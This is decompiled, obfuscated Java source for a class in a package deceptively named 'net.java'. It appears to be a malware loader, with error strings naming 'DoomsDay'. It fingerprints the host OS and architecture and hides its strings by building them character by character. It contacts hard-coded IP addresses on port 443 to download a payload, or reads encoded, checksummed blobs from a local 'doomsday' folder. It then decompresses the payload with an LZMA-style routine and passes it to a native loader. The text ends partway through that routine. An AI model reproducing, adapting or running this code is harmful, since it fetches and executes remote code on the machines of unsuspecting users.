package net.java;

import java.io.ByteArrayOutputStream;
import java.io.File;
import java.io.InputStream;
import java.io.PrintStream;
import java.io.RandomAccessFile;
import java.net.InetAddress;
import java.net.InetSocketAddress;
import java.nio.ByteBuffer;
import java.nio.channels.SocketChannel;
import java.util.Arrays;
import java.util.Iterator;
import java.util.Map;
import java.util.zip.CRC32;

public class l {
   private static String c;
   private static final int a;
   private static final int b;
   public static Map a;
   public static String a;
   public static String b;
   public static long a;
   public static long b;
   private static volatile boolean a;
   private byte[] a;
   private int c;
   private int d = 0;
   private int e;
   private byte[] b;
   private int f;
   private int g;
   private int h;
   private byte[] c;
   private int i;
   private int j;
   private int k;
   private int l;
   private short[][] a;
   private short[] a = new short[192];
   private short[] b = new short[12];
   private short[] c = new short[12];
   private short[] d = new short[12];
   private short[] e = new short[12];
   private short[] f = new short[192];
   private short[][] b = new short[4][];
   private short[] g = new short[114];
   private short[] h = new short[16];
   private short[] i = new short[2];
   private short[][] c = new short[16][];
   private short[][] d = new short[16][];
   private short[] j = new short[256];
   private int m = 0;
   private short[] k = new short[2];
   private short[][] e = new short[16][];
   private short[][] f = new short[16][];
   private short[] l = new short[256];
   private int n = 0;
   private int o = -1;
   private int p = -1;
   private int q;

   static {
      StringBuilder var2;
      (var2 = new StringBuilder()).append('U');
      var2.append('T');
      var2.append('F');
      var2.append('-');
      var2.append('8');
      c = var2.toString();
      a = System.getProperties();
      byte var0 = -1;
      String var1 = null;
      String var7 = null;
      String var3 = null;
      Iterator var5 = a.entrySet().iterator();

      while(var5.hasNext()) {
         Map.Entry var4;
         int var6 = (var4 = (Map.Entry)var5.next()).getKey().hashCode();
         Object var14 = var4.getValue();
         if (var6 == -1228098475) {
            var1 = var14.toString().toLowerCase();
         } else if (var6 == 1174476494) {
            var7 = var14.toString().toLowerCase();
         } else if (var6 == -1228469728) {
            var3 = var14.toString().toLowerCase();
         }
      }

      label66: {
         if (var7 != null) {
            String var10000 = var7;
            StringBuilder var8;
            (var8 = new StringBuilder()).append('a');
            var8.append('n');
            var8.append('d');
            var8.append('r');
            var8.append('o');
            var8.append('i');
            var8.append('d');
            if (var10000.contains(var8.toString())) {
               var0 = 3;
               break label66;
            }
         }

         if (var1 != null) {
            StringBuilder var9;
            (var9 = new StringBuilder()).append('w');
            var9.append('i');
            var9.append('n');
            if (var1.contains(var9.toString())) {
               var0 = 0;
            } else {
               (var9 = new StringBuilder()).append('l');
               var9.append('i');
               var9.append('n');
               var9.append('u');
               var9.append('x');
               if (var1.contains(var9.toString())) {
                  var0 = 1;
               } else {
                  label59: {
                     (var9 = new StringBuilder()).append('m');
                     var9.append('a');
                     var9.append('c');
                     if (!var1.contains(var9.toString())) {
                        (var9 = new StringBuilder()).append('o');
                        var9.append('s');
                        var9.append('x');
                        if (!var1.contains(var9.toString())) {
                           (var9 = new StringBuilder()).append('o');
                           var9.append('s');
                           var9.append(' ');
                           var9.append('x');
                           if (!var1.contains(var9.toString())) {
                              var0 = -1;
                              break label59;
                           }
                        }
                     }

                     var0 = 2;
                  }
               }
            }
         }
      }

      b = var0;
      int var15;
      if ((var15 = var3.hashCode()) != 93084186 && var15 != -1221096139) {
         if (var15 != -806050265 && var15 != 92926582) {
            if (var15 != 117110 && var15 != -806050360 && var15 != 3178856 && var15 != 3179817 && var15 != 3180778 && var15 != 3181739) {
               a = -1;
            } else {
               a = 1;
            }
         } else {
            a = 0;
         }
      } else {
         a = 2;
      }
   }

   public static native Object n(Object var0);

   public static int a(Object var0) {
      Object[] var5;
      byte[] var1 = (byte[])(var5 = var0)[0];
      int var2 = (Integer)var5[1];
      byte[] var6;
      if ((var6 = (byte[])var5[2]).length == 0) {
         return -1;
      } else {
         var2 -= var6.length;

         label27:
         for(int var3 = 0; var3 <= var2; ++var3) {
            for(int var4 = 0; var4 < var6.length; ++var4) {
               if (var6[var4] != var1[var3 + var4]) {
                  continue label27;
               }
            }

            return var3;
         }

         return -1;
      }
   }

   public static int a(Object var0, Object var1) {
      byte[] var5 = (byte[])var0;
      byte[] var6 = (byte[])var1;
      int var2 = var5.length;
      if (var6.length == 0) {
         return -1;
      } else {
         var2 -= var6.length;

         label27:
         for(int var3 = 0; var3 <= var2; ++var3) {
            for(int var4 = 0; var4 < var6.length; ++var4) {
               if (var6[var4] != var5[var3 + var4]) {
                  continue label27;
               }
            }

            return var3;
         }

         return -1;
      }
   }

   private static boolean a(char var0) {
      if (var0 >= '0' && var0 <= '9') {
         return true;
      } else if (var0 >= 'A' && var0 <= 'F') {
         return true;
      } else {
         return var0 >= 'a' && var0 <= 'f';
      }
   }

   private static byte[] a(byte[] var0, byte[] var1) {
      byte[] var2 = null;
      int var3;
      if ((var3 = a((Object)var0, (Object)var1)) >= 0) {
         int var4 = var0.length;

         for(int var5 = var3; var5 < var0.length; ++var5) {
            if (var0[var5] == 32) {
               var4 = var5;
               break;
            }
         }

         if (var4 > 0) {
            byte[] var9;
            var1 = new byte[(var9 = var2 = a(var0, var3 + var1.length, var4)).length];
            var3 = 0;

            for(int var14 = 0; var14 < var9.length; ++var14) {
               char var16;
               if ((var16 = (char)var9[var14]) == 92) {
                  if (var14 + 3 >= var9.length) {
                     break;
                  }

                  if (var9[var14 + 1] == 120 && a((char)var9[var14 + 2]) && a((char)var9[var14 + 3])) {
                     int var10001 = var3++;
                     byte var10002 = var9[var14 + 2];
                     byte var6 = var9[var14 + 3];
                     var16 = var10002;
                     char var7 = 0;
                     char var8 = 0;
                     if (var16 >= 48 && var16 <= 57) {
                        var7 = (char)(var16 - 48);
                     }

                     if (var16 >= 65 && var16 <= 70) {
                        var7 = (char)(var16 - 65 + 10);
                     }

                     if (var16 >= 97 && var16 <= 102) {
                        var7 = (char)(var16 - 97 + 10);
                     }

                     if (var6 >= 48 && var6 <= 57) {
                        var8 = (char)(var6 - 48);
                     }

                     if (var6 >= 65 && var6 <= 70) {
                        var8 = (char)(var6 - 65 + 10);
                     }

                     if (var6 >= 97 && var6 <= 102) {
                        var8 = (char)(var6 - 97 + 10);
                     }

                     var1[var10001] = (byte)(var7 << 4 | var8);
                  }

                  var14 += 3;
               } else {
                  var1[var3++] = (byte)var16;
               }
            }

            byte[] var15 = a(var1, var3);

            for(int var18 = 0; var18 < var1.length; ++var18) {
               var1[var18] = 0;
            }

            for(int var10 = 0; var10 < var2.length; ++var10) {
               var2[var10] = 0;
            }

            var2 = var15;
         }
      }

      return var2;
   }

   public static void a(Object var0) {
      if (!a) {
         a = true;
         Object[] var11;
         byte[] var1 = (byte[])(var11 = var0)[0];
         Object var2 = var11[1];
         int var3 = (Integer)var11[2];
         ClassLoader var4 = (ClassLoader)var11[3];
         Object var5 = var11[4];
         String var12;
         if ((var12 = (String)var11[5]) != null && var12.length() == 0) {
            var12 = null;
         }

         byte[] var6 = null;
         byte[] var7 = null;
         if (var1 != null) {
            byte[] var8 = new byte[]{45, 45, 100, 111, 111, 109, 115, 100, 97, 121, 118, 101, 114, 115, 105, 111, 110, 61};
            var7 = a(var1, var8);

            for(int var9 = 0; var9 < 18; ++var9) {
               var8[var9] = 0;
            }

            var6 = var7;
            var8 = new byte[]{45, 45, 99, 111, 110, 102, 105, 103, 115, 116, 111, 114, 97, 103, 101, 61};
            var7 = a(var1, var8);

            for(int var20 = 0; var20 < 16; ++var20) {
               var8[var20] = 0;
            }
         }

         if (d() && var7 == null && (var3 == 6 || var3 == 5)) {
            var7 = new byte[]{36, 100, 101, 102, 97, 117, 108, 116, 36};
            if (var1 == null) {
               var1 = new byte[]{45, 45, 99, 111, 110, 102, 105, 103, 115, 116, 111, 114, 97, 103, 101, 61, 36, 100, 101, 102, 97, 117, 108, 116, 36};
            }
         }

         byte[] var13;
         if ((var13 = (byte[])a((Object)(new Object[]{var12, var3, var6, var7}))) != null) {
            try {
               if (!net.java.g.a()) {
                  throw new RuntimeException();
               } else {
                  Object[] var15;
                  (var15 = new Object[8])[0] = new long[1];
                  var15[1] = new long[]{(long)var3};
                  var15[2] = var1;
                  var15[3] = var2;
                  var15[4] = var13;
                  var15[5] = null;
                  var15[6] = var4;
                  var15[7] = var5;
                  n(var15);

                  for(int var14 = 0; var14 < var13.length; ++var14) {
                     var13[var14] = 0;
                  }

               }
            } catch (Throwable var10) {
               PrintStream var21 = System.out;
               StringBuilder var18;
               (var18 = new StringBuilder()).append('E');
               var18.append('r');
               var18.append('r');
               var18.append('o');
               var18.append('r');
               var18.append(' ');
               var18.append('l');
               var18.append('o');
               var18.append('a');
               var18.append('d');
               var18.append(' ');
               var18.append('D');
               var18.append('o');
               var18.append('o');
               var18.append('m');
               var18.append('s');
               var18.append('D');
               var18.append('a');
               var18.append('y');
               var21.println(var18.toString());
               var10.printStackTrace();
            }
         } else {
            PrintStream var10000 = System.out;
            StringBuilder var17;
            (var17 = new StringBuilder()).append('E');
            var17.append('r');
            var17.append('r');
            var17.append('o');
            var17.append('r');
            var17.append(' ');
            var17.append('l');
            var17.append('o');
            var17.append('a');
            var17.append('d');
            var17.append(' ');
            var17.append('D');
            var17.append('o');
            var17.append('o');
            var17.append('m');
            var17.append('s');
            var17.append('D');
            var17.append('a');
            var17.append('y');
            var17.append(' ');
            var17.append('-');
            var17.append(' ');
            var17.append('u');
            var17.append('p');
            var17.append('d');
            var17.append('a');
            var17.append('t');
            var17.append('e');
            var17.append(' ');
            var17.append('n');
            var17.append('o');
            var17.append('t');
            var17.append(' ');
            var17.append('f');
            var17.append('o');
            var17.append('u');
            var17.append('n');
            var17.append('d');
            var10000.println(var17.toString());
         }
      }
   }

   private static Object a(Object var0) {
      Object[] var10;
      String var1 = (String)(var10 = var0)[0];
      int var2 = (Integer)var10[1];
      byte[] var3 = (byte[])var10[2];
      byte[] var11 = (byte[])var10[3];
      if (var1 != null && var3 == null) {
         try {
            byte[] var4;
            if ((var4 = a((String)var1, (String)null)) != null) {
               return var4;
            }
         } catch (Throwable var9) {
            PrintStream var10000 = System.out;
            StringBuilder var6;
            (var6 = new StringBuilder()).append('S');
            var6.append('t');
            var6.append('o');
            var6.append('r');
            var6.append('e');
            var6.append('d');
            var6.append(' ');
            var6.append('1');
            var10000.println(var6.toString());
            var9.printStackTrace();
         }
      }

      byte[] var14;
      if (Arrays.equals(var14 = new byte[]{36, 108, 97, 116, 101, 115, 116, 36}, var3)) {
         var3 = null;
      }

      for(int var5 = 0; var5 < 8; ++var5) {
         var14[var5] = 0;
      }

      byte[] var15;
      if ((c() && g() || d()) && (var2 == 4 || var2 == 12)) {
         if ((var15 = (byte[])a((Object)a((Object)var11), (Object)var3)) == null) {
            var15 = (byte[])b((Object)var3);
         }
      } else if ((var15 = (byte[])b((Object)var3)) == null) {
         var15 = (byte[])a((Object)a((Object)var11), (Object)var3);
      }

      if (var15 == null && var1 != null) {
         try {
            if ((var11 = a((String)var1, (String)null)) != null) {
               var15 = var11;
            }
         } catch (Throwable var8) {
            PrintStream var18 = System.out;
            StringBuilder var16;
            (var16 = new StringBuilder()).append('S');
            var16.append('t');
            var16.append('o');
            var16.append('r');
            var16.append('e');
            var16.append('d');
            var16.append(' ');
            var16.append('2');
            var18.println(var16.toString());
            var8.printStackTrace();
         }
      }

      if (var2 == 1 || var2 == 12) {
         try {
            if (var1 != null && (var11 = a((String)var1, (String)null)) != null && var15 != null && a(var11) > a(var15)) {
               var15 = var11;
            }
         } catch (Throwable var7) {
            PrintStream var19 = System.out;
            StringBuilder var17;
            (var17 = new StringBuilder()).append('S');
            var17.append('t');
            var17.append('o');
            var17.append('r');
            var17.append('e');
            var17.append('d');
            var17.append(' ');
            var17.append('3');
            var19.println(var17.toString());
            var7.printStackTrace();
         }
      }

      return var15;
   }

   private static String a(Object var0) {
      String var1 = null;
      if (var0 != null && var0 instanceof byte[]) {
         byte[] var2;
         if (!Arrays.equals(var2 = new byte[]{36, 100, 101, 102, 97, 117, 108, 116, 36}, (byte[])var0)) {
            try {
               var1 = new String((byte[])var0, c);
            } catch (Throwable var3) {
            }
         }

         for(int var4 = 0; var4 < 9; ++var4) {
            var2[var4] = 0;
         }
      }

      if (var1 == null) {
         StringBuilder var5;
         (var5 = new StringBuilder()).append('d');
         var5.append('o');
         var5.append('o');
         var5.append('m');
         var5.append('s');
         var5.append('d');
         var5.append('a');
         var5.append('y');
         var1 = (new File(var5.toString())).getAbsolutePath();
      }

      return var1;
   }

   private static Object b(Object var0) {
      byte[] var1 = new byte[]{-91, 22, -60, 0};
      byte[] var2 = new byte[]{42, 3, -80, -64, 0, 2, 0, -48, 0, 0, 0, 0, 20, 44, -32, 1};
      byte[] var17;
      if (var0 != null) {
         byte[] var3 = new byte[0];
         if (var0 instanceof byte[]) {
            var3 = (byte[])((byte[])var0).clone();
         } else if (var0 instanceof String) {
            try {
               var3 = ((String)var0).getBytes(c);
            } catch (Throwable var14) {
            }
         }

         (var17 = new byte[8 + var3.length])[0] = 22;
         var17[1] = 3;
         var17[2] = 100;
         var17[3] = (byte)var3.length;

         for(int var4 = 0; var4 < var3.length; ++var4) {
            var17[var4 + 8] = var3[var4];
         }
      } else {
         var17 = new byte[]{22, 3, 100, 0, 0, 0, 0, 0};
      }

      try {
         SocketChannel var18 = SocketChannel.open();

         try {
            var18.connect(new InetSocketAddress(InetAddress.getByAddress(var1), 443));
         } catch (Throwable var13) {
            var18.connect(new InetSocketAddress(InetAddress.getByAddress(var2), 443));
         }

         ByteBuffer var20;
         (var20 = ByteBuffer.allocateDirect(var17.length)).put(var17);
         var20.position(0);
         var18.write(var20);
         var20.position(0);
         var20.put(new byte[var20.limit()]);
         var20 = ByteBuffer.allocateDirect(4);
         var18.read(var20);
         int var5;
         if ((var5 = 0 | (var20.get(0) & 255) << 24 | (var20.get(1) & 255) << 16 | (var20.get(2) & 255) << 8 | var20.get(3) & 255) > 0) {
            var20.position(0);
            var20.put(new byte[var20.limit()]);
            byte[] var22 = new byte[var5];
            ByteBuffer var6 = ByteBuffer.allocateDirect(16384);

            int var8;
            for(int var7 = 0; var7 < var5 && (var8 = var18.read(var6)) >= 0; var7 += var8) {
               var6.position(0);
               var6.get(var22, var7, var8);
               var6.clear();
            }

            var18.close();
            var6.position(0);
            var6.put(new byte[var6.limit()]);
            byte[] var19 = var22;
            return var19;
         }

         var18.close();
      } catch (Exception var15) {
         var15.printStackTrace();
         return null;
      } finally {
         for(int var23 = 0; var23 < var17.length; ++var23) {
            var17[var23] = 0;
         }

         for(int var24 = 0; var24 < 4; ++var24) {
            var1[var24] = 0;
         }

         for(int var25 = 0; var25 < 16; ++var25) {
            var2[var25] = 0;
         }

      }

      return null;
   }

   public static byte[] a(String var0, String var1) {
      try {
         InputStream var2;
         if ((var2 = l.class.getResourceAsStream(var0)) == null) {
            return var1 != null ? (byte[])b((Object)var1) : null;
         } else {
            byte[] var6 = new byte[16384];
            ByteArrayOutputStream var5 = new ByteArrayOutputStream(var2.available());

            int var3;
            while((var3 = var2.read(var6)) != -1) {
               var5.write(var6, 0, var3);
            }

            var2.close();
            return var5.toByteArray();
         }
      } catch (Exception var4) {
         throw new RuntimeException(var4);
      }
   }

   private static Object a(Object var0, Object var1) {
      File var11;
      if (var0 instanceof String) {
         var11 = new File((String)var0);
      } else {
         var11 = (File)var0;
      }

      byte[] var2 = null;
      byte[] var3 = null;
      ByteArrayOutputStream var4 = null;
      int var5 = 0;

      try {
         if ((var11 = ((File)var11).listFiles()) == null) {
            return null;
         }

         for(int var6 = 0; var6 < var11.length; ++var6) {
            String var7;
            int var13;
            if ((var7 = var11[var6].getName()).length() > 8 && var7.length() < 20 && (var13 = a(var7)) > 0) {
               if (var4 == null) {
                  var4 = new ByteArrayOutputStream(1310720);
               }

               if (var2 == null) {
                  var2 = new byte[65536];
               }

               RandomAccessFile var14;
               label76: {
                  var4.reset();
                  File var10002 = var11[var6];
                  StringBuilder var8;
                  (var8 = new StringBuilder()).append('r');
                  var14 = new RandomAccessFile(var10002, var8.toString());
                  if (var1 != null) {
                     byte[] var9 = new byte[64];
                     var14.readFully(var9);
                     if (!Arrays.equals(c(var9), (byte[])var1)) {
                        break label76;
                     }

                     var4.write(var9);
                  }

                  if (var13 > var5) {
                     int var15;
                     while((var15 = var14.read(var2)) >= 0) {
                        var4.write(var2, 0, var15);
                     }

                     var3 = var4.toByteArray();
                     var5 = var13;
                  }
               }

               var14.close();
            }
         }
      } catch (Throwable var10) {
         var10.printStackTrace();
      }

      return var3;
   }

   public static void b(Object var0) {
      try {
         Object[] var1;
         File var3 = (File)(var1 = (byte[])(var0))[0];
         var1 = var1[1];
         File var10002 = var3;
         StringBuilder var4;
         (var4 = new StringBuilder()).append('r');
         var4.append('w');
         RandomAccessFile var5;
         (var5 = new RandomAccessFile(var10002, var4.toString())).write(var1);
         var5.close();
      } catch (Throwable var2) {
      }
   }

   private static byte[] c(byte[] var0) {
      var0 = (byte[])(([B)var0).clone();
      int var1 = 0;

      for(int var2 = 6; var2 < 64; ++var2) {
         var0[var2] = (byte)(var0[var2] ^ 71);
         if (var0[var2] == 0 && var1 == 0) {
            var1 = var2;
         }
      }

      if (var1 == 0) {
         var1 = 64;
      }

      return a(var0, 6, var1);
   }

   private static int a(byte[] var0) {
      return 0 + ((var0[0] & 255) << 24) + ((var0[1] & 255) << 16) + ((var0[2] & 255) << 8) + (var0[3] & 255);
   }

   private static int a(String var0) {
      try {
         if (var0 == null) {
            StringBuilder var20;
            (var20 = new StringBuilder()).append('n');
            var20.append('u');
            var20.append('l');
            var20.append('l');
            throw new NumberFormatException(var20.toString());
         }

         int var1;
         if ((var1 = var0.length()) > 0) {
            if (var0.charAt(0) == '-') {
               StringBuilder var19;
               (var19 = new StringBuilder()).append('I');
               var19.append('l');
               var19.append('l');
               var19.append('e');
               var19.append('g');
               var19.append('a');
               var19.append('l');
               var19.append(' ');
               var19.append('l');
               var19.append('e');
               var19.append('a');
               var19.append('d');
               var19.append('i');
               var19.append('n');
               var19.append('g');
               var19.append(' ');
               var19.append('m');
               var19.append('i');
               var19.append('n');
               var19.append('u');
               var19.append('s');
               var19.append(' ');
               var19.append('s');
               var19.append('i');
               var19.append('g');
               var19.append('n');
               var19.append(' ');
               var19.append('o');
               var19.append('n');
               var19.append(' ');
               var19.append('u');
               var19.append('n');
               var19.append('s');
               var19.append('i');
               var19.append('g');
               var19.append('n');
               var19.append('e');
               var19.append('d');
               var19.append(' ');
               var19.append('s');
               var19.append('t');
               var19.append('r');
               var19.append('i');
               var19.append('n');
               var19.append('g');
               var19.append(' ');
               var19.append('%');
               var19.append('s');
               var19.append('.');
               throw new NumberFormatException(String.format(var19.toString(), var0));
            }

            long var10000;
            if (var1 <= 12) {
               var10000 = Long.parseLong(var0, 32);
            } else {
               long var3 = Long.parseLong(var0.substring(0, var1 - 1), 32);
               if ((var1 = Character.digit(var0.charAt(var1 - 1), 32)) < 0) {
                  StringBuilder var18;
                  (var18 = new StringBuilder()).append('B');
                  var18.append('a');
                  var18.append('d');
                  var18.append(' ');
                  var18.append('d');
                  var18.append('i');
                  var18.append('g');
                  var18.append('i');
                  var18.append('t');
                  var18.append(' ');
                  var18.append('a');
                  var18.append('t');
                  var18.append(' ');
                  var18.append('e');
                  var18.append('n');
                  var18.append('d');
                  var18.append(' ');
                  var18.append('o');
                  var18.append('f');
                  var18.append(' ');
                  throw new NumberFormatException(var18.toString() + var0);
               }

               long var5;
               var10000 = (var5 = (var3 << 5) + (long)var1) + Long.MIN_VALUE;
               long var9 = var3 + Long.MIN_VALUE;
               long var7 = var10000;
               if ((var10000 < var9 ? -1 : (var7 == var9 ? 0 : 1)) < 0) {
                  StringBuilder var17;
                  (var17 = new StringBuilder()).append('S');
                  var17.append('t');
                  var17.append('r');
                  var17.append('i');
                  var17.append('n');
                  var17.append('g');
                  var17.append(' ');
                  var17.append('v');
                  var17.append('a');
                  var17.append('l');
                  var17.append('u');
                  var17.append('e');
                  var17.append(' ');
                  var17.append('%');
                  var17.append('s');
                  var17.append(' ');
                  var17.append('e');
                  var17.append('x');
                  var17.append('c');
                  var17.append('e');
                  var17.append('e');
                  var17.append('d');
                  var17.append('s');
                  var17.append(' ');
                  var17.append('r');
                  var17.append('a');
                  var17.append('n');
                  var17.append('g');
                  var17.append('e');
                  var17.append(' ');
                  var17.append('o');
                  var17.append('f');
                  var17.append(' ');
                  var17.append('u');
                  var17.append('n');
                  var17.append('s');
                  var17.append('i');
                  var17.append('g');
                  var17.append('n');
                  var17.append('e');
                  var17.append('d');
                  var17.append(' ');
                  var17.append('l');
                  var17.append('o');
                  var17.append('n');
                  var17.append('g');
                  var17.append('.');
                  throw new NumberFormatException(String.format(var17.toString(), var0));
               }

               var10000 = var5;
            }

            long var15 = var10000 ^ 4773789072989332985L;
            byte[] var13;
            (var13 = new byte[8])[0] = (byte)((int)(var15 >>> 56 & 255L));
            var13[1] = (byte)((int)(var15 >>> 48 & 255L));
            var13[2] = (byte)((int)(var15 >>> 40 & 255L));
            var13[3] = (byte)((int)(var15 >>> 32 & 255L));
            var13[4] = (byte)((int)(var15 >>> 24 & 255L));
            var13[5] = (byte)((int)(var15 >>> 16 & 255L));
            var13[6] = (byte)((int)(var15 >>> 8 & 255L));
            var13[7] = (byte)((int)(var15 & 255L));
            short var16 = (short)((short)(0 + ((var13[6] & 255) << 8)) + (var13[7] & 255));
            CRC32 var2;
            (var2 = new CRC32()).update(var13, 0, 6);
            if ((short)((int)var2.getValue()) != var16) {
               return -2;
            }

            return 0 + ((var13[1] & 255) << 24) + ((var13[2] & 255) << 16) + ((var13[3] & 255) << 8) + (var13[4] & 255);
         }

         throw new IllegalArgumentException();
      } catch (NumberFormatException var11) {
      } catch (Exception var12) {
         var12.printStackTrace();
      }

      return -1;
   }

   public static final byte[] a(byte[] var0) {
      byte[] var3 = new byte[var0.length];

      int var2;
      for(var2 = var0.length; var2 - 1 > 0 && var0[var2 - 1] == 61; --var2) {
      }

      if (var2 - 1 == 0) {
         return null;
      } else {
         byte[] var4 = new byte[var2 * 3 / 4];

         for(int var1 = 0; var1 < var2; ++var1) {
            if (var0[var1] == 43) {
               var3[var1] = 62;
            } else if (var0[var1] == 47) {
               var3[var1] = 63;
            } else if (var0[var1] < 58) {
               var3[var1] = (byte)(var0[var1] + 52 - 48);
            } else if (var0[var1] < 91) {
               var3[var1] = (byte)(var0[var1] - 65);
            } else if (var0[var1] < 123) {
               var3[var1] = (byte)(var0[var1] + 26 - 97);
            }
         }

         int var9 = 0;

         for(var5 = 0; var9 < var2 && var5 < var4.length / 3 * 3; var9 += 4) {
            var4[var5++] = (byte)(var3[var9] << 2 & 252 | var3[var9 + 1] >>> 4 & 3);
            var4[var5++] = (byte)(var3[var9 + 1] << 4 & 240 | var3[var9 + 2] >>> 2 & 15);
            var4[var5++] = (byte)(var3[var9 + 2] << 6 & 192 | var3[var9 + 3] & 63);
         }

         if (var9 < var2) {
            if (var9 < var2 - 2) {
               var4[var5++] = (byte)(var3[var9] << 2 & 252 | var3[var9 + 1] >>> 4 & 3);
               var4[var5] = (byte)(var3[var9 + 1] << 4 & 240 | var3[var9 + 2] >>> 2 & 15);
            } else if (var9 < var2 - 1) {
               var4[var5] = (byte)(var3[var9] << 2 & 252 | var3[var9 + 1] >>> 4 & 3);
            }
         }

         return var4;
      }
   }

   public static boolean a() {
      return b == 0;
   }

   public static boolean b() {
      return b == 2;
   }

   public static boolean c() {
      return b == 1;
   }

   public static boolean d() {
      return b == 3;
   }

   public static boolean e() {
      return a == 1;
   }

   public static boolean f() {
      return a == 0;
   }

   public static boolean g() {
      return a == 2;
   }

   private void a() {
      this.b();
      this.b = null;
   }

   private void b() {
      int var1;
      if ((var1 = this.c - this.e) != 0) {
         for(int var2 = 0; var2 < var1; ++var2) {
            this.b[var2 + this.f] = this.a[this.e + var2];
         }

         this.f += var1;
         if (this.c >= this.d) {
            this.c = 0;
         }

         this.e = this.c;
      }
   }

   private byte a(int var1) {
      if ((var1 = this.c - var1 - 1) < 0) {
         var1 += this.d;
      }

      return this.a[var1];
   }

   private int a() {
      return this.c[this.i++] & 255;
   }

   private int a(Object var1, int var2) {
      short[] var5;
      short var3 = (var5 = (short[])var1)[var2];
      int var4 = (this.g >>> 11) * var3;
      if ((this.h ^ Integer.MIN_VALUE) < (var4 ^ Integer.MIN_VALUE)) {
         this.g = var4;
         var5[var2] = (short)(var3 + (2048 - var3 >>> 5));
         if ((this.g & -16777216) == 0) {
            this.h = this.h << 8 | this.a();
            this.g <<= 8;
         }

         return 0;
      } else {
         this.g -= var4;
         this.h -= var4;
         var5[var2] = (short)(var3 - (var3 >>> 5));
         if ((this.g & -16777216) == 0) {
            this.h = this.h << 8 | this.a();
            this.g <<= 8;
         }

         return 1;
      }
   }

   private static void c(Object var0) {
      short[] var2 = (short[])var0;

      for(int var1 = 0; var1 < var2.length; ++var1) {
         var2[var1] = 1024;
      }

   }

   public l() {
      for(int var1 = 0; var1 < 4; ++var1) {
         this.b[var1] = new short[64];
      }

   }

   private int b(Object var1) {
      short[] var5 = (short[])var1;
      int var2 = 31 - a(var5.length);
      int var3 = 1;

      for(int var4 = var2; var4 != 0; --var4) {
         var3 = (var3 << 1) + this.a((Object)var5, var3);
      }

      return var3 - (1 << var2);
   }

   private static int a(int var0) {
      if (var0 == 0) {
         return 32;
      } else {
         int var1 = 1;
         if (var0 >>> 16 == 0) {
            var1 += 16;
            var0 <<= 16;
         }

         if (var0 >>> 24 == 0) {
            var1 += 8;
            var0 <<= 8;
         }

         if (var0 >>> 28 == 0) {
            var1 += 4;
            var0 <<= 4;
         }

         if (var0 >>> 30 == 0) {
            var1 += 2;
            var0 <<= 2;
         }

         return var1 - (var0 >>> 31);
      }
   }

   private boolean a(byte[] var1, byte[] var2) {
      long var3 = (long)var2.length;
      this.c = var1;
      this.i = 13;
      this.a();
      this.b = var2;
      l var12 = this;
      this.e = 0;
      this.c = 0;
      c((Object)this.a);
      c((Object)this.f);
      c((Object)this.b);
      c((Object)this.c);
      c((Object)this.d);
      c((Object)this.e);
      c((Object)this.g);
      l var9 = this;
      int var18 = 1 << this.j + this.k;

      for(int var14 = 0; var14 < var18; ++var14) {
         c((Object)(var9.a[var14]));
      }

      for(int var26 = 0; var26 < 4; ++var26) {
         c((Object)(var12.b[var26]));
      }

      c((Object)var12.i);

      for(int var13 = 0; var13 < var12.m; ++var13) {
         c((Object)(var12.c[var13]));
         c((Object)(var12.d[var13]));
      }

      c((Object)(var12.j));
      c((Object)var12.k);

      for(int var45 = 0; var45 < var12.n; ++var45) {
         c((Object)(var12.e[var45]));
         c((Object)(var12.f[var45]));
      }

      c((Object)(var12.l));
      c((Object)(var12.h));
      var9 = var12;
      var12.h = 0;
      var12.g = -1;

      for(int var19 = 0; var19 < 5; ++var19) {
         var9.h = var9.h << 8 | var9.a();
      }

      int var17 = 0;
      var18 = 0;
      int var5 = 0;
      int var6 = 0;
      int var7 = 0;
      long var10 = 0L;
      int var8 = 0;

      while(var3 < 0L || var10 < var3) {
         int var28 = (int)var10 & this.q;
         if (this.a((Object)this.a, (var17 << 4) + var28) == 0) {
            short[] var25 = this.a[(((int)var10 & this.l) << this.j) + ((var8 & 255) >>> 8 - this.j)];
            if (var17 >= 7) {
               byte var43 = this.a(var18);
               var28 = 1;

               label160:
               do {
                  int var50 = var43 >> 7 & 1;
                  var43 = (byte)(var43 << 1);
                  int var53 = this.a((Object)var25, (var50 + 1 << 8) + var28);
                  var28 = var28 << 1 | var53;
                  if (var50 != var53) {
                     while(true) {
                        if (var28 >= 256) {
                           break label160;
                        }

                        var28 = var28 << 1 | this.a((Object)var25, var28);
                     }
                  }
               } while(var28 < 256);

               var8 = (byte)var28;
            } else {
               int var44 = 1;

               while((var44 = var44 << 1 | this.a((Object)var25, var44)) < 256) {
               }

               var8 = (byte)var44;
            }

            this.a[this.c++] = (byte)var8;
            if (this.c >= this.d) {
               this.b();
            }

            var17 = var17 < 4 ? 0 : (var17 < 10 ? var17 - 3 : var17 - 6);
            ++var10;
         } else {
            if (this.a((Object)this.b, var17) == 1) {
               var8 = 0;
               if (this.a((Object)this.c, var17) == 0) {
                  if (this.a((Object)this.f, (var17 << 4) + var28) == 0) {
                     var17 = var17 < 7 ? 9 : 11;
                     var8 = 1;
                  }
               } else {
                  int var35;
                  if (this.a((Object)this.d, var17) == 0) {
                     var35 = var5;
                  } else {
                     if (this.a((Object)this.e, var17) == 0) {
                        var35 = var6;
                     } else {
                        var35 = var7;
                        var7 = var6;
                     }

                     var6 = var5;
                  }

                  var5 = var18;
                  var18 = var35;
               }

               if (var8 == 0) {
                  int var36;
                  if (this.a((Object)this.k, 0) == 0) {
                     var36 = this.b((Object)this.e[var28]);
                  } else if (this.a((Object)this.k, 1) == 0) {
                     var36 = 8 + this.b((Object)this.f[var28]);
                  } else {
                     var36 = 8 + 8 + this.b((Object)this.l);
                  }

                  var8 = var36 + 2;
                  var17 = var17 < 7 ? 8 : 11;
               }
            } else {
               var7 = var6;
               var6 = var5;
               var5 = var18;
               int var37;
               if (this.a((Object)this.i, 0) == 0) {
                  var37 = this.b((Object)this.c[var28]);
               } else if (this.a((Object)this.i, 1) == 0) {
                  var37 = 8 + this.b((Object)this.d[var28]);
               } else {
                  var37 = 8 + 8 + this.b((Object)this.j);
               }

               var8 = var37 + 2;
               var17 = var17 < 7 ? 7 : 10;
               var37 = var8 - 2;
               if ((var28 = this.b((Object)this.b[var37 < 4 ? var37 : 3])) >= 4) {
                  int var46 = (var28 >> 1) - 1;
                  var18 = (2 | var28 & 1) << var46;
                  if (var28 < 14) {
                     int var51 = 1;
                     var37 = 0;

                     for(int var15 = 0; var15 < var46; ++var15) {
                        int var16 = this.a((Object)this.g, var18 - var28 - 1 + var51);
                        var51 = (var51 << 1) + var16;
                        var37 |= var16 << var15;
                     }

                     var18 += var37;
